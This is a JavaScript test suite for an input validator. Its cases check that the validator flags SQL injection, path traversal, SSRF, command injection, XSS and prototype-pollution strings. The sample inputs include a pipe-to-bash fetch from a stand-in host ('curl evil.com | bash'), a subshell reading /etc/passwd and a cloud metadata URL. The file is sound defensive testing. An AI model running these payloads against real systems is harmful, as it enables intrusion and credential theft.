/**
 * Input Validator Test Suite
 * ==========================
 * Tests all 8 threat categories + sanitization.
 */

'use strict';

const { InputValidator } = require('../../src/security/input-validator');

describe('InputValidator', () => {
  let validator;

  beforeEach(() => {
    validator = new InputValidator();
  });

  describe('SQL Injection', () => {
    test('detects SELECT union injection', () => {
      const result = validator.validate('test.tool', {
        query: "'; SELECT * FROM users --",
      });
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.includes('SQL_INJECTION'))).toBe(true);
    });

    test('detects OR 1=1 bypass', () => {
      const result = validator.validate('test.tool', {
        filter: "' OR 1=1",
      });
      expect(result.safe).toBe(false);
    });

    test('detects WAITFOR DELAY timing attack', () => {
      const result = validator.validate('test.tool', {
        input: "'; WAITFOR DELAY '00:00:10'--",
      });
      expect(result.safe).toBe(false);
    });

    test('allows normal SQL-like keywords in context', () => {
      const result = validator.validate('test.tool', {
        description: 'Select the best option for the user',
      });
      // "Select" alone without injection context should pass
      expect(result.safe).toBe(true);
    });
  });

  describe('Path Traversal', () => {
    test('detects ../etc/passwd', () => {
      const result = validator.validate('file.read', {
        path: '../../../etc/passwd',
      });
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.includes('PATH_TRAVERSAL'))).toBe(true);
    });

    test('detects URL-encoded traversal', () => {
      const result = validator.validate('file.read', {
        path: '%2e%2e%2fetc%2fpasswd',
      });
      expect(result.safe).toBe(false);
    });

    test('detects null byte injection', () => {
      const result = validator.validate('file.read', {
        path: 'image.png\0.php',
      });
      expect(result.safe).toBe(false);
    });

    test('allows normal file paths', () => {
      const result = validator.validate('file.read', {
        path: '/home/user/documents/report.pdf',
      });
      expect(result.safe).toBe(true);
    });
  });

  describe('SSRF', () => {
    test('blocks localhost URLs', () => {
      const result = validator.validate('network.fetch', {
        url: 'http://localhost:8080/admin',
      });
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.includes('SSRF'))).toBe(true);
    });

    test('blocks 169.254 cloud metadata', () => {
      const result = validator.validate('network.fetch', {
        url: 'http://169.254.169.254/latest/meta-data/',
      });
      expect(result.safe).toBe(false);
    });

    test('blocks internal 10.x IPs', () => {
      const result = validator.validate('network.fetch', {
        url: 'http://10.0.0.1:3000/internal-api',
      });
      expect(result.safe).toBe(false);
    });

    test('blocks file:// protocol', () => {
      const result = validator.validate('network.fetch', {
        url: 'file:///etc/passwd',
      });
      expect(result.safe).toBe(false);
    });

    test('allows external HTTPS URLs', () => {
      const result = validator.validate('network.fetch', {
        url: 'https://api.github.com/repos',
      });
      expect(result.safe).toBe(true);
    });
  });

  describe('Command Injection', () => {
    test('detects pipe to bash', () => {
      const result = validator.validate('system.exec', {
        command: 'curl evil.com | bash',
      });
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.includes('COMMAND_INJECTION'))).toBe(true);
    });

    test('detects backtick execution', () => {
      const result = validator.validate('system.exec', {
        input: '`whoami`',
      });
      expect(result.safe).toBe(false);
    });

    test('detects $() subshell', () => {
      const result = validator.validate('system.exec', {
        input: '$(cat /etc/passwd)',
      });
      expect(result.safe).toBe(false);
    });
  });

  describe('XSS', () => {
    test('detects script tags', () => {
      const result = validator.validate('web.render', {
        content: '<script>alert("xss")</script>',
      });
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.includes('XSS'))).toBe(true);
    });

    test('detects javascript: URI', () => {
      const result = validator.validate('web.render', {
        href: 'javascript:void(0)',
      });
      expect(result.safe).toBe(false);
    });

    test('detects event handler injection', () => {
      const result = validator.validate('web.render', {
        attr: 'onerror=alert(1)',
      });
      expect(result.safe).toBe(false);
    });
  });

  describe('Prototype Pollution', () => {
    test('detects __proto__ key', () => {
      const result = validator.validate('data.update', {
        nested: { '__proto__': { isAdmin: true } },
      });
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.includes('PROTOTYPE_POLLUTION'))).toBe(true);
    });

    test('detects constructor.prototype', () => {
      const result = validator.validate('data.update', {
        payload: 'constructor.prototype.isAdmin = true',
      });
      expect(result.safe).toBe(false);
    });
  });

  describe('Size & Depth Limits', () => {
    test('rejects oversized input', () => {
      const result = validator.validate('test.tool', {
        data: 'x'.repeat(10000),
      });
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.includes('SIZE'))).toBe(true);
    });

    test('rejects deeply nested objects', () => {
      let deep = { value: 'end' };
      for (let i = 0; i < 15; i++) deep = { nested: deep };
      const result = validator.validate('test.tool', deep);
      expect(result.safe).toBe(false);
      expect(result.threats.some(t => t.includes('nesting depth'))).toBe(true);
    });
  });

  describe('Sanitization', () => {
    test('removes null bytes from paths', () => {
      const result = validator.validate('file.read', {
        filePath: '/normal/path\0.exe',
      });
      // Should be caught by PATH_TRAVERSAL null byte pattern
      expect(result.safe).toBe(false);
    });
  });
});
